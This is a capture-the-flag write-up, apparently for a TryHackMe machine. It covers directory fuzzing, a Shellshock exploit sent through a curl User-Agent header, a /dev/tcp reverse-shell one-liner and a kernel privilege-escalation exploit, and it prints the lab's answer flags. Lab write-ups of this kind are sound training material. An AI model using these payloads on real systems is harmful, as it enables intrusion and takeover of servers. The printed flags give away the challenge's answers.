# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---


![Pasted image 20250429135028.png](../../IMAGES/Pasted%20image%2020250429135028.png)

Let's fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.214.142/FUZZ" -ic -c -t 200 -e .php,.html,.git

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.214.142/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .git
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 284ms]
.html                   [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 285ms]
                        [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 285ms]
uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 162ms]
img                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 933ms]
cgi-bin                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 933ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 163ms]
js                      [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 160ms]
backup                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 159ms]
secret                  [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 159ms]
```


We got some interesting findings like `backup, secret` and `cgi-bin` let's check the first two:

![Pasted image 20250429140047.png](../../IMAGES/Pasted%20image%2020250429140047.png)

There's an `id_rsa` key on here, we don't have the username so, let's simply save it for now, let's proceed to `secret`:


![Pasted image 20250429140228.png](../../IMAGES/Pasted%20image%2020250429140228.png)

I tried getting some info with `steghide` but no luck, let's proceed then with `cgi-bin`, aÂ `cgi-bin`Â directory often indicates the presence of legacy CGI (Common Gateway Interface) scripts, which can be vulnerable to attacks likeÂ **Shellshock**,Â **command injection**, orÂ **path traversal**Â if poorly coded. 

Let's try `shellshock`, this vulnerability allows remote code execution without confirmation. A series of random characters, `() { :; }; ,` confuses Bash because it doesn't know what to do with them, so by default, it executes the code after it.

We need to fuzz the directory to find the script inside of it:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.214.142/cgi-bin/FUZZ" -ic -c -t 200 -e .cgi

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.214.142/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .cgi
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

test.cgi                [Status: 200, Size: 13, Words: 2, Lines: 2, Duration: 163ms]
```

There we go, let's proceed with exploitation.




# EXPLOITATION
---

With this, we can start the `shellshock` attack, let's test it:

```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'" http://10.10.214.142/cgi-bin/test.cgi
```

![Pasted image 20250429140729.png](../../IMAGES/Pasted%20image%2020250429140729.png)

There we go, `shellshock` attack works, let's get a shell then:

```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'sh -i >& /dev/tcp/IP/9001 0>&1'" http://10.10.214.142/cgi-bin/test.cgi
```


![Pasted image 20250429140854.png](../../IMAGES/Pasted%20image%2020250429140854.png)


We can proceed with privilege escalation.



# PRIVILEGE ESCALATION
---


Let's stabilize our shell first:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250429141002.png](../../IMAGES/Pasted%20image%2020250429141002.png)

Let's use `linpeas` to look for any `PE` vector:


![Pasted image 20250429142332.png](../../IMAGES/Pasted%20image%2020250429142332.png)

As seen, we are dealing with a `3.13.0-32-generic` Linux version, let's search information about how to escalate privileges in it:

![Pasted image 20250429142418.png](../../IMAGES/Pasted%20image%2020250429142418.png)

There's a `c` exploit we can get, once we get it on our victim machine, we can do the following:

```
gcc pe.c -o pe
```

If we try compiling it, we get this error:

```
www-data@ubuntu:/tmp$ gcc pe.c -o privesc
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

This is a problem in the `PATH`, we can fix it with:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now, let's compile again:

```
gcc pe.c -o pe
```

![Pasted image 20250429143345.png](../../IMAGES/Pasted%20image%2020250429143345.png)

There we go, we can simply run it now:

![Pasted image 20250429143408.png](../../IMAGES/Pasted%20image%2020250429143408.png)

We are root now and can finally read both flags:

```
# cat /home/ryan/user.txt
THM{Sh3llSh0ck_r0ckz}
```

```
# cat /root/root.txt
THM{g00d_j0b_0day_is_Pleased}
```

![Pasted image 20250429143558.png](../../IMAGES/Pasted%20image%2020250429143558.png)

